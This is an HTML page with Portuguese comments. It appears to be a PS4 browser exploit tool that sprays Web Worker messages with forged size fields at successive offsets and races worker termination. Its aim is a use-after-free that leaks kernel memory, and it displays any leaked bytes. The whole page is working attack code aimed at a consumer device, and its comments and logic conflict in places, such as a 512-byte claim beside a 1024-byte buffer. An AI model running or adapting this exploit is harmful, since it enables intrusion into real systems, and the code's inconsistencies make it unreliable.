<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <title>PS4 STRUCTURE FUZZER 2</title>
    <style>
        body { background-color: #111; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        .panel { border: 1px solid #444; background: #222; padding: 20px; margin: 20px auto; max-width: 600px; }
        
        input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 1.5em; width: 100px; text-align: center; }
        button { padding: 15px 30px; font-size: 1.2em; background: #c00; color: #fff; border: none; cursor: pointer; margin-top: 10px; }
        button:hover { background: #f00; }
        
        #current-test { font-size: 3em; font-weight: bold; color: #ff0; margin: 20px; }
        #log { text-align: left; height: 200px; overflow-y: scroll; border: 1px solid #555; padding: 10px; color: #aaa; }
        
        .success { background-color: #0f0 !important; color: #000 !important; }
    </style>
</head>
<body>

    <h1>KERNEL FUZZER (SIZE HUNT)</h1>
    
    <div class="panel">
        <label>Começar no Offset:</label><br>
        <input type="number" id="start-offset" value="0" step="4">
        <br><br>
        <button onclick="startFuzzing()">INICIAR VARREDURA</button>
    </div>

    <div id="current-test">PARADO</div>
    <div id="log">Logs aparecerão aqui...</div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 1024;
        
        // VALOR DE TESTE: 
        // 0x2000 = 8192 bytes (Queremos forçar um vazamento grande)
        // Se o offset for um tamanho, o kernel tentará ler 8192 bytes.
        const TEST_VALUE = 0x2000; 

        let workers = [];
        let currentOffset = 0;
        let fuzzInterval = null;

        // Worker Inteligente: Analisa o tamanho da resposta
        const blob = new Blob([`
            onmessage = function(e) {
                // Devolve o tamanho real e os dados se forem grandes
                postMessage({len: e.data.byteLength, data: e.data});
            }
        `], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
        }

        function startFuzzing() {
            currentOffset = parseInt(document.getElementById('start-offset').value);
            document.getElementById('current-test').innerText = "PREPARANDO...";
            
            // Cria threads
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    const w = new Worker(url);
                    w.onmessage = handleResponse;
                    workers.push(w);
                } else {
                    clearInterval(i);
                    log("Threads prontas. Iniciando loop de Fuzzing...");
                    fuzzNext();
                }
            }, 30);
        }

        function fuzzNext() {
            // Limite de segurança (Estrutura tem 512 bytes)
            if(currentOffset >= SPRAY_SIZE) {
                document.getElementById('current-test').innerText = "FIM DA VARREDURA";
                return;
            }

            // Atualiza tela (Se o console desligar, você saberá onde parou)
            document.getElementById('current-test').innerText = `OFFSET: ${currentOffset}`;
            
            // Prepara Payload
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); // Fundo seguro
            
            // INJETA O VALOR DE TAMANHO FALSO NO OFFSET ATUAL
            const view = new DataView(payload.buffer);
            // offset, value, littleEndian
            try {
                view.setUint32(currentOffset, TEST_VALUE, true); 
            } catch(e) {
                // Ignora erros de alinhamento no final
            }

            // Dispara UAF
            let attempts = 0;
            const atk = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { 
                    if(workers.length > 0) workers[0].postMessage(payload); 
                } catch(e){}
                
                attempts++;
                if(attempts > 20) { // Tenta 20x por offset
                    clearInterval(atk);
                    // Passa para o próximo offset
                    currentOffset += 4; // Pula de 4 em 4 bytes (Int32)
                    setTimeout(fuzzNext, 200); // Delay pequeno
                }
            }, 10);
        }

        function handleResponse(e) {
            const len = e.data.len;
            
            // Se recebermos mais dados do que enviamos (512)
            if (len > SPRAY_SIZE) {
                // SUCESSO ABSOLUTO!
                document.body.style.backgroundColor = "#050";
                document.getElementById('current-test').className = "success";
                document.getElementById('current-test').innerText = `LEAK NO OFFSET ${currentOffset}!`;
                
                log(`!!! VAZAMENTO DETECTADO !!!`);
                log(`Tamanho recebido: ${len}`);
                log(`OFFSET MÁGICO: ${currentOffset}`); // Esse é o offset 432 ou outro
                
                // Extrai o leak para mostrar na tela
                const bytes = new Uint8Array(e.data.data);
                let leakHex = "";
                // Pega os primeiros 32 bytes DEPOIS dos 512 originais
                for(let k=SPRAY_SIZE; k < len && k < SPRAY_SIZE+32; k++) {
                    leakHex += bytes[k].toString(16).padStart(2,'0');
                }
                log(`DADOS EXTRAÍDOS: ${leakHex}`);

                // Para tudo
                workers.forEach(w => w.terminate());
                workers = [];
                currentOffset = 9999;
                alert(`LEAK ENCONTRADO NO OFFSET ${currentOffset}! TIRE UMA FOTO!`);
            }
        }

    </script>
</body>
</html>




